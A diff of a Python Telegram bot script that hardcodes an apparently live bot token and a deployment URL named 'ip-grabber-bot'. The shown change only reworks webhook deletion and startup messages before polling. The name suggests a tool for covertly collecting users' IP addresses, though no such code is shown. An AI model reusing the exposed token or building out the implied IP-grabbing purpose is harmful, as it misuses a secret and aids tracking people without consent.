@@ -1,17 +1,19 @@
 import telebot
 from telebot import types
-import os
+import time
 
-# YOUR CREDENTIALS (HARDCODED)
+# YOUR CREDENTIALS
 BOT_TOKEN = "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg"
 WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
 LOG_CHANNEL = "-1001234567890123"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# FIX WEBHOOK CONFLICT
+# FIX MULTIPLE INSTANCE CONFLICT
+print("Deleting webhook to fix conflict...")
 bot.delete_webhook(drop_pending_updates=True)
-print("Webhook deleted successfully.")
+time.sleep(3)   # Tunggu 3 detik agar instance lama mati
+print("Webhook deleted successfully. Starting polling...")
 
 @bot.chat_join_request_handler()
 def handle_join_request(request: types.ChatJoinRequest):
